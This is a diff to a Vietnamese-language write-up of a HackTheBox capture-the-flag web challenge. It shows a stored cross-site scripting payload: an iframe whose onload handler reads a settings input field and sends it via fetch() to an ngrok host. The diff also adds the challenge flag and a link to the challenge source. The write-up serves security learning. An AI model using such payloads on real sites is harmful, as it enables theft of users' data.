@@ -19,4 +19,8 @@ bây giờ ta chỉ cần chèn mã script vào bất kỳ trường __name, ema
 <iframe id="iframetrung" src="settings" onload=fetch("http://027d-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/?flag="+btoa(document.getElementById('iframetrung').contentWindow.document.getElementsByTagName("input")[4].value)); >
 </iframe>
 ```
-và dùng công cụ ngrok để nhận flag gửi về
+ dùng công cụ ngrok để nhận flag gửi về
+__HTB{bl1nk_bl1nk_bl1nd_bl1nd}__
+<br />
+
+[source của bài này](https://github.com/magnetohvcs/ctf/raw/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/web_blink_host.zip)
